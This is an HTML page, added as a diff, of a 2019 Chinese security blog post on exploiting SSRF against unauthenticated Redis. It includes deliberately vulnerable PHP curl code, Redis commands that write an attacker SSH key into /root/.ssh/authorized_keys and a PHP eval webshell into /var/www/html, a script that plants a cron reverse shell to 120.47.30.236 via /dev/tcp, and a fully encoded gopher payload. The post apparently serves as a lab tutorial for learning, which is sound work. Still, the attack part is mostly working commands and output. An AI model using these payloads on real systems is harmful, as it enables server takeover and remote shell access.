@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言基础漏洞类型果然还是得写篇博客记录一下比较稳妥,结果却导致了一些意想不到的问题……. SSRF简介SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 最基础的漏洞场景http://www.xxx.com/image.php?image=http://www.xxc.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF进行Redis未授权访问">
+<meta property="og:url" content="http://yoursite.com/2019/11/02/SSRF与Redis未授权访问/index.html">
+<meta property="og:site_name" content="R1dd1er&#39;s blogs">
+<meta property="og:description" content="前言基础漏洞类型果然还是得写篇博客记录一下比较稳妥,结果却导致了一些意想不到的问题……. SSRF简介SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 最基础的漏洞场景http://www.xxx.com/image.php?image=http://www.xxc.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/00643K3oly1g8gpcdond7j314103swev.jpg">
+<meta property="og:updated_time" content="2019-11-02T15:30:23.926Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF进行Redis未授权访问">
+<meta name="twitter:description" content="前言基础漏洞类型果然还是得写篇博客记录一下比较稳妥,结果却导致了一些意想不到的问题……. SSRF简介SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 最基础的漏洞场景http://www.xxx.com/image.php?image=http://www.xxc.">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/00643K3oly1g8gpcdond7j314103swev.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'R1dd1er'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/02/SSRF与Redis未授权访问/">
+
+
+
+
+
+  <title>SSRF进行Redis未授权访问 | R1dd1er's blogs</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R1dd1er's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">积跬步，至千里</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/02/SSRF与Redis未授权访问/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R1dd1er">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R1dd1er's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SSRF进行Redis未授权访问</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-02T23:30:04+08:00">
+                2019-11-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基础漏洞类型果然还是得写篇博客记录一下比较稳妥,结果却导致了一些意想不到的问题…….</p>
+<h2 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<h4 id="最基础的漏洞场景"><a href="#最基础的漏洞场景" class="headerlink" title="最基础的漏洞场景"></a>最基础的漏洞场景</h4><p><code>http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</code></p>
+<p>这样的链接就是有可能存在ssrf的,因为服务器有可能是向本机发起请求来获取相应的图片</p>
+<p>倘若没有对image参数进行任何的检测,就可以构造其他的请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://127.0.0.1:22</span><br><span class="line">http://www.xxx.com/image.php?image=file:///etc/passwd</span><br><span class="line">http://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)</span><br><span class="line">http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求)</span><br></pre></td></tr></table></figure>
+<p>ssrf1.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>常见的web语言,php和java分别还能使用下面的协议<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:</span><br><span class="line">http、https、file、gopher、phar、dict、ftp、ssh、telnet...</span><br><span class="line">java:</span><br><span class="line">http、https、file、ftp、jar、netdoc、mailto...</span><br></pre></td></tr></table></figure></p>
+<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><blockquote>
+<p>在我们日常的Java Web开发中，无不都是使用数据库来进行数据的存储，由于一般的系统任务中通常不会存在高并发的情况，所以这样看起来并没有什么问题，可是一旦涉及大数据量的需求，比如一些商品抢购的情景，或者是主页访问量瞬间较大的时候，单一使用数据库来保存数据的系统会因为面向磁盘，磁盘读/写速度比较慢的问题而存在严重的性能弊端，一瞬间成千上万的请求到来，需要系统在极短的时间内完成成千上万次的读/写操作，这个时候往往不是数据库能够承受的，极其容易造成数据库系统瘫痪，最终导致服务宕机的严重生产问题。</p>
+<p>就Redis技术而言，它的性能十分优越，可以支持每秒十几万此的读/写操作，其性能远超数据库，并且还支持集群、分布式、主从同步等配置，原则上可以无限扩展，让更多的数据存储在内存中</p>
+</blockquote>
+<p>此外,Redis还有个重要特点，其所有操作都是原子性的，要么成功执行，要么完全不执行。</p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># 启动 redis</span><br><span class="line">$redis-server</span><br><span class="line"></span><br><span class="line">$/etc/init.d/redis-server start</span><br><span class="line"></span><br><span class="line"># 关闭 redis</span><br><span class="line"></span><br><span class="line">$/etc/init.d/redis-server stop</span><br><span class="line"></span><br><span class="line">$redis-cli shutdown</span><br><span class="line"></span><br><span class="line"># 打开客户端（交互模式）</span><br><span class="line">$redis-cli</span><br><span class="line"></span><br><span class="line">$ping  # 测试是否启动</span><br><span class="line">=&gt; pong # 则成功</span><br><span class="line"></span><br><span class="line"># 远程连接</span><br><span class="line">$redis-cli -h host -p port -a password</span><br><span class="line"></span><br><span class="line"># 执行命令</span><br><span class="line">$redis-cli -h 127.0.0.1-p 6379 get hello</span><br><span class="line">&quot;world&quot;</span><br><span class="line"></span><br><span class="line">$redis-cli -r 3 ping  # -r 将命令重复执行多次，[-i 3 则是每三秒执行一次命令]</span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line"></span><br><span class="line">$echo &quot;world&quot; |redis-cli -x set hello  # -x 从标准输入作为该命令的最后一个参数</span><br><span class="line">Ok</span><br><span class="line"></span><br><span class="line">info					# 提供服务器的信息和统计</span><br><span class="line">flushall 				# 删除所有数据库内容</span><br><span class="line">flushdb					# 刷新数据库</span><br><span class="line">set test &quot;test&quot; 		# 设置变量</span><br><span class="line">config set dir dirpath 	# 设置路径等配置</span><br><span class="line">config get xxx			# 获取动态配置信息</span><br><span class="line">save 					# 将内存中的数据保存到硬盘中</span><br><span class="line">get var					</span><br><span class="line">select 2				# 选择 2 号数据库，默认有 16 个数据库</span><br><span class="line">del key  				# 删除返回 1</span><br><span class="line">exists key 				# 检查 key 是否存在</span><br><span class="line">expire key seconds 		# 给 key 设置过期时间（秒）</span><br><span class="line">expireat key timestamp	# 设置过期时间（时间戳）</span><br><span class="line">keys pattern			# 查找符合模式的 key，用 ? * 模糊匹配</span><br><span class="line">move key db				# 将当前数据库 key 移动到数据库 db 中</span><br><span class="line">persist key				# 移除过期时间，key 持续有效</span><br><span class="line">pttl key				# 返回 key 剩余生存时间（毫秒）</span><br><span class="line">ttl key 				# 返回 key 剩余生存时间（秒）</span><br><span class="line">randomkey				# 随机返回一个 key</span><br><span class="line">rename key newkey		# 重命名</span><br><span class="line">renamex key newkey		# 仅当 newkey 不存在时重命名</span><br><span class="line">type key				# 获取类型</span><br><span class="line">dump key				# 序列化</span><br></pre></td></tr></table></figure>
+<h3 id="RESP"><a href="#RESP" class="headerlink" title="RESP"></a>RESP</h3><p>Redis 即 REmote Dictionary Server (远程字典服务)；而Redis的协议规范是 Redis Serialization Protocol (Redis序列化协议),该协议是用于与Redis服务器通信的，用的较多的是Redis-cli通过pipe与Redis服务器联系；</p>
+<p>客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。</p>
+<p>服务器根据命令实现回复一种RESP类型。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在RESP中，某些数据的类型取决于第一个字节：</span><br><span class="line">对于Simple Strings，回复的第一个字节是+</span><br><span class="line">对于error，回复的第一个字节是-</span><br><span class="line">对于Integer，回复的第一个字节是:</span><br><span class="line">对于Bulk Strings，回复的第一个字节是$</span><br><span class="line">对于array，回复的第一个字节是*</span><br><span class="line">此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。</span><br><span class="line">在RESP中，协议的不同部分始终以&quot;\r\n&quot;(CRLF)结束。</span><br></pre></td></tr></table></figure></p>
+<h3 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h3><p>尝试直接<code>redis-cli -h ip</code>,因为redis默认无密码,所以连接成功.</p>
+<p>连接上去后发现不能执行任何的命令,看来linux的redis已经有了对于远程访问的保护措施</p>
+<blockquote>
+<p>(error) DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface.</p>
+</blockquote>
+<p>当然，修改一些配置就可以进行远程访问了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1前面加上#号</span><br><span class="line">修改redis.conf的protected-mode为no</span><br></pre></td></tr></table></figure>
+<p>遇到个无语的问题，ubuntu直接执行<code>redis-server</code>是加载默认配置文件的，但是我进行<code>redis-server /etc/redis/redis.conf</code>就是没有反应，弄了半天也加载不了我修改的文件，最后发现需要用<code>service redis-server restart</code>重启</p>
+<p>经过测试，ubuntu服务器虽然有保护测试，但是我用centos服务器直接下载压缩包安装,默认的配置倒是没有保护措施，嗯，配置文件没给你准备protected-mode,不过用<code>yum install redis</code>倒也是有保护</p>
+<p>ubuntu aptget的redis默认开启防护  centos因为是下载压缩包编译安装，所以默认没开防护</p>
+<p>既然这样，那就用Centos做实验吧</p>
+<h4 id="写入公钥连接ssh"><a href="#写入公钥连接ssh" class="headerlink" title="写入公钥连接ssh"></a>写入公钥连接ssh</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ cat key.txt | redis-cli -h 127.0.0.1 -x set key</span><br><span class="line">$ redis-cli -h 127.0.0.1</span><br><span class="line">127.0.0.1:6379&gt; config set dir /root/.ssh/</span><br><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/root/.ssh&quot;</span><br><span class="line">127.0.0.1:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">127.0.0.1:6379&gt; config get dbfilename</span><br><span class="line">1) &quot;dbfilename&quot;</span><br><span class="line">2) &quot;authorized_keys&quot;</span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>接下来就用私钥连接ssh<br><code>ssh root@ip</code></p>
+<p>(这里采用<code>ssh –i  id_rsa root@ip</code>会报错<code>ssh: Could not resolve hostname \342\200\223i: Temporary failure in name resolution</code>,搞了一会没解决，发现其实直接就可以连接了)</p>
+<h4 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n\n&lt;?php eval($_POST[1]);?&gt;\n&quot;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<h4 id="恢复初始设置"><a href="#恢复初始设置" class="headerlink" title="恢复初始设置"></a>恢复初始设置</h4><p>以下是默认配置，更妥当的做法是使用 config get dir 记录下之前的配置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 恢复dir</span><br><span class="line">config set dir /var/lib/redis</span><br><span class="line"></span><br><span class="line"># 恢复dbfilename</span><br><span class="line">config set dbfilename dump.rdb</span><br><span class="line"></span><br><span class="line"># 刷新数据库</span><br><span class="line">flushdb</span><br></pre></td></tr></table></figure></p>
+<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><p>gopher是早期的一个互联网协议,能将Internet上的文件组织成某种索引,现在已经没啥人用了,但是最经常见到的还是配合ssrf来打redis</p>
+<p>基本格式<code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code></p>
+<p>gopher协议不仅仅可以拿来打redis，还可以打FastCGI</p>
+<h2 id="用gopher协议进行ssrf攻击redis"><a href="#用gopher协议进行ssrf攻击redis" class="headerlink" title="用gopher协议进行ssrf攻击redis"></a>用gopher协议进行ssrf攻击redis</h2><p>存在相关漏洞的代码 ssrf2.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</span><br><span class="line">    // 限制为HTTPS、HTTP协议</span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>构造一个反弹shell的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 -p $2 flushall</span><br><span class="line">echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/120.47.30.236/23336 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure></p>
+<p>第一行是删除所有数据库中的所有key，可以不加<br>在redis的第0个数据库中添加key为1，value为<code>\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/120.47.30.236/23336 0&gt;&amp;1\n\n\n\n</code>的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。<br>dir 数据库备份的文件放置路径<br>Dbfilename 备份文件的文件名</p>
+<p>执行<code>bash shell.sh 127.0.0.1 6379</code>,当然在这之前先开启socat准备转发流量</p>
+<p>使用socat抓取流量,这里是一个流量端口转发,将2345端口的流量转发到6379<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ socat -v tcp-listen:2345,fork tcp-connect:localhost:6379</span><br><span class="line">&gt; 2019/10/18 23:45:18.406761  length=18 from=0 to=17</span><br><span class="line">*1\r</span><br><span class="line">$8\r</span><br><span class="line">flushall\r</span><br><span class="line">&lt; 2019/10/18 23:45:18.410261  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019/10/18 23:45:18.413790  length=88 from=0 to=87</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$1\r</span><br><span class="line">1\r</span><br><span class="line">$61\r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/120.47.30.236/23336 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2019/10/18 23:45:18.415622  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019/10/18 23:45:18.418228  length=57 from=0 to=56</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$16\r</span><br><span class="line">/var/spool/cron/\r</span><br><span class="line">&lt; 2019/10/18 23:45:18.419439  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019/10/18 23:45:18.422462  length=52 from=0 to=51</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br></pre></td></tr></table></figure></p>
+<p>使用一个现有的脚本转换为gopher协议格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">#author: JoyChou</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">exp = &apos;&apos;</span><br><span class="line"></span><br><span class="line">with open(sys.argv[1]) as f:</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        if line[0] in &apos;&gt;&lt;+&apos;:</span><br><span class="line">            continue</span><br><span class="line">        # 判断倒数第2、3字符串是否为\r</span><br><span class="line">        elif line[-3:-1] == r&apos;\r&apos;:</span><br><span class="line">            # 如果该行只有\r，将\r替换成%0a%0d%0a</span><br><span class="line">            if len(line) == 3:</span><br><span class="line">                exp = exp + &apos;%0a%0d%0a&apos;</span><br><span class="line">            else:</span><br><span class="line">                line = line.replace(r&apos;\r&apos;, &apos;%0d%0a&apos;)</span><br><span class="line">                # 去掉最后的换行符</span><br><span class="line">                line = line.replace(&apos;\n&apos;, &apos;&apos;)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        # 判断是否是空行，空行替换为%0a</span><br><span class="line">        elif line == &apos;\x0a&apos;:</span><br><span class="line">            exp = exp + &apos;%0a&apos;</span><br><span class="line">        else:</span><br><span class="line">            line = line.replace(&apos;\n&apos;, &apos;&apos;)</span><br><span class="line">            exp = exp + line</span><br><span class="line">print exp</span><br></pre></td></tr></table></figure></p>
+<p>生成的遵循gopher协议的字符串如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/120.47.30.236/23336 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure></p>
+<p>不过真正的payload需要在前面加一个下划线<code>_</code>,不然打不通</p>
